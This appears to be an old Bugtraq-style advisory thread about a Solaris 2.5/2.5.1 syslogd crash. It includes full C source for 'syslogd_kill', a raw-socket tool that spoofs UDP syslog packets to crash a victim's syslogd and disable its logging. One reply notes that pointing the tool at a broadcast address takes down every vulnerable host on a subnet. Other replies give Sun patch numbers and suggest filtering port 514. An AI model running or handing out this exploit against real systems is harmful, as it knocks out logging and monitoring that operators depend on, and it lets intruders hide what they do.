@@ -1,0 +1,260 @@
+
+  It seems that I've stumbled upon a bug which must have been discovered
+but never disclosed, I find it hard to believe noone has found this.  After
+searching the bugtraq archives and the publicly available patches from
+Sun I am still under the impression that this hasn't been released until
+now.
+
+  When Solaris syslogd receives an external message it attempts to do
+a DNS lookup on the source IP.  Many times, if this IP doesn't match a
+DNS record then syslogd will crash with a Seg Fault.  I have not had
+time to diagnose completely how dangerous this is, as I didn't feel like
+spending time debugging DNS packets, but at the very least it will disable
+logging on the target machine.  It also turns out that depending on the
+source IP, syslogd will either Seg Fault or Bus Error which leads me
+to believe this could be most harmful.
+
+  This has been tested on Solaris 2.5 and 2.5.1 for both Sparc and x86 with
+full patches.  Solaris 2.6 Sparc does not appear to be vulnerable.
+
+  The only solution at the moment (because I know of no way to disable
+remote logging under Solaris) is to filter off udp port 514 whenever
+possible and perhaps to respawn syslogd from inittab.
+
+  If this is an old bug, well the patch shoulda been included in Sun's
+recommended security patches.  If not, as it says, your milage may vary.
+
+  (Is there anyone left who isn't a security consultant?)
+
+/*------------------------*/
+/*
+
+  To effectively kill a Solaris<2.6 syslogd use in the following manner:
+
+  ./syslogd_kill <ip-with-no-DNS> <victim IP>
+
+  My favorite is the 10.20.10.1 IP as this was the first IP I found which
+killed syslogd and hasn't failed to work yet.  Then again, I haven't found
+a Solaris box that wasn't 2.6 that this hasn't worked on.  Let me know
+what you find.
+
+  Sorry if any credits were deleted, I really didn't know I was gonna
+distribute this.  This is the syslog_spoof code that was posted to
+bugtraq a few weeks back, but modified to work with BSD and Solaris.
+
+To compile under Solaris use:  cc -lnsl -lsocket syslogd_kill.c
+
+This code has been tested only under Solaris and FreeBSD 3.0.
+If it doesn't work under Linux, just go get the old Linux code off
+a bugtraq archive.
+
+                        lb@inext.net
+*/
+
+/*
+[NOTE: This may not apply anymore, I don't touch Linux. - lb]
+
+The code compiles and works under Linux.  Any Unix that has
+SOCK_RAW/IPPROTO_RAW should be no problem (you may need to use BSD-style
+struct ip though).  It may use few improvements, like checking for possible
+ICMP Port Unreachable errors in case the remote machine doesn't run syslogd
+with remote reception turned on.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <syslog.h>
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <errno.h>
+#include <netinet/in_systm.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_var.h>
+#include <netinet/tcpip.h>
+
+#define IPVERSION       4
+
+/* This is the stuff that actually gets sent.  Feel free to change it */
+#define MESSAGE_FAC LOG_LOCAL7
+/* I use LOCAL7 because it is probably not caught as often  - lb */
+#define MESSAGE_PRI LOG_DEBUG
+/* Debug is especially unlikely to be caught - lb*/
+char message[] = {""};  /* This is the message which would have been */
+                        /* spoofed and is still received by syslog before */
+                        /* it dies.. so I made it empty. - lb */
+
+struct raw_pkt_hdr {
+        struct ip iphdr;
+        struct udphdr udp;
+};
+
+struct raw_pkt_hdr* pkt;
+
+void die(char *);
+unsigned short checksum(unsigned short*,char);
+
+int main(int argc,char** argv){
+
+struct sockaddr_in sa;
+struct sockaddr_in sa2;
+int sock,packet_len;
+char usage[] = {"\
+  syslog_deluxe, yuri volobuev'97\n\
+  modded by lb Oct97\n\
+  make syslog look the way you want, here there and everywhere\n\n\
+\t usage: syslog_deluxe src_hostname dst_hostname\n\n\
+\t to kill syslogd: syslog_deluxe <IP-with-no-DNS> <victim IP>\n\n"};
+
+static int on = 1;
+
+if(argc != 3)die(usage);
+
+bzero((struct sockaddr_in *)&sa, sizeof(sa));
+bzero((struct sockaddr_in *)&sa2, sizeof(sa2));
+
+if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+        perror("socket");
+        exit(1);
+        }
+
+sa.sin_family = AF_INET;
+sa.sin_addr.s_addr = inet_addr(argv[2]);
+sa2.sin_family = AF_INET;
+sa2.sin_addr.s_addr = inet_addr(argv[1]);
+
+packet_len = sizeof(struct raw_pkt_hdr)+strlen(message)+4;
+pkt = calloc((size_t)1,(size_t)packet_len);
+
+pkt->iphdr.ip_v = IPVERSION;
+pkt->iphdr.ip_hl = 0x5;
+pkt->iphdr.ip_len = packet_len;
+pkt->iphdr.ip_ttl = 0x40;
+pkt->iphdr.ip_p = IPPROTO_UDP;
+pkt->iphdr.ip_sum = 0;
+
+pkt->iphdr.ip_src.s_addr = sa2.sin_addr.s_addr;
+pkt->iphdr.ip_dst.s_addr = sa.sin_addr.s_addr;
+
+pkt->iphdr.ip_sum = checksum((unsigned short*)pkt,sizeof(struct ip));
+
+pkt->udp.uh_sport = htons(514);
+pkt->udp.uh_dport = htons(514);
+pkt->udp.uh_ulen = htons(packet_len - sizeof(struct ip));
+pkt->udp.uh_sum = 0;  /* If you feel like screwing around with pseudo-headers
+                        and stuff, you may of course calculate UDP checksum
+                        as well.  I chose to leave it zero, it's usually OK */
+
+sprintf((char*)pkt+sizeof(struct raw_pkt_hdr),"<%d>%s",
+        (int)(MESSAGE_FAC | MESSAGE_PRI),message);
+
+if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
+        perror("setsockopt: IP_HDRINCL");
+        exit(1);
+        }
+
+if(sendto(sock,(char *)&pkt->iphdr,packet_len,(int)NULL,(struct sockaddr*)&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+        }
+exit(0);
+}
+
+void die(char* str){
+fprintf(stderr,"%s\n",str);
+exit(1);
+}
+
+unsigned short checksum(unsigned short* addr,char len){
+/* This is a simplified version that expects even number of bytes */
+register long sum = 0;
+
+while(len > 1){
+        sum += *addr++;
+        len -= 2;
+        }
+while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);
+
+return ~sum;
+}
+
+
+
+
+-----------------------------------------------------------------------
+
+We've run into the same issue, and Sun has known about it since April.
+There is a patch, 103738-04, which fixes this (and other) problems.
+It is **NOT** a recommended or a security patch, nor is it available
+from the public area of sunsolve.  It clearly should be.
+
+There are many installations where syslogd is a critical part of the
+security/monitoring infrastructure.  There are even some where REMOTE
+syslogging is critical.  It is a terrible choice, but many times the
+only one available.  I'd recommend using Paul Vixie's syslogd, or at
+least filtering 514/udp.  It won't solve syslogd's spoofing problems,
+but at least messages won't disappear.
+
+-----------------------------------------------------------------------
+
+  I got alot of responses about the syslogd killing, which mostly
+affirmed by belief that the bug had been noticed before.  Sun seems to
+have attributed the bug to "LOCAL" facility syslog traffic loads causing
+syslogd to die.  I've tried using LOG_AUTH and most of the syslog
+facilities and they all seem to cause syslogd to crash.  There was a
+patch released by Sun to solve the "LOCAL" problem, but it doesn't seem
+to be publicly available so I can't test it.
+
+  Also, alot of people are under the impression that this has nothing
+to do with DNS.  I tried it many times to make sure, because it seemed
+exploitable to me.. I would watch the syslog message come in, watch
+the DNS query go out, and then watch syslogd die.  If I inserted a DNS
+entry for the IP in question, syslogd would query and work fine.. if I
+removed the DNS entry again, syslogd would crash.  Perhaps you're right..
+but I'll stick to my assumption.  hoho.
+
+  If anyone knows where I could get that patch, and it's publicly
+available.. then please let me know.. If anything, this should be included
+in the Solaris 2.5.1 and 2.5 Recommended patch set..
+
+                                lb@inext.net
+
+-----------------------------------------------------------------------
+
+> I don't know if the following patches are available from Sun without
+> a support contract, but they fix the problem lb is describing:
+>
+>   for Solaris 2.5 SPARC:    103291-02
+>   for Solaris 2.5.1 SPARC:  103738-04  (fix was actually made in 103738-01)
+>                     x86:    103739-05  (fix was actually made in 103739-01)
+
+They don't appear to be publically available via SunSolve Online, but
+are available from this unofficial SunOS patch repository.
+
+ftp://qiclab.scn.rain.com/pub/sunos-patches/sol25/
+ftp://qiclab.scn.rain.com/pub/sunos-patches/sol251/
+ftp://qiclab.scn.rain.com/pub/sunos-patches/sol251_x86/
+
+
+-----------------------------------------------------------------------
+
+>  ./syslogd_kill <ip-with-no-DNS> <victim IP>
+
+Kind of wild if you feed it a subnet broadcast address as the <victim IP>.
+
+I wouldn't try that lightly if you don't have access to restart
+all the dead syslogd's on all Solaris boxes on that wire.
+
+At least that's what happened to me running 2.5.1 and 2.5 with
+various patch revs, but none with 103738-04.
+
+Excuse me, I have to restart a few syslogd's and apply some patches.
+
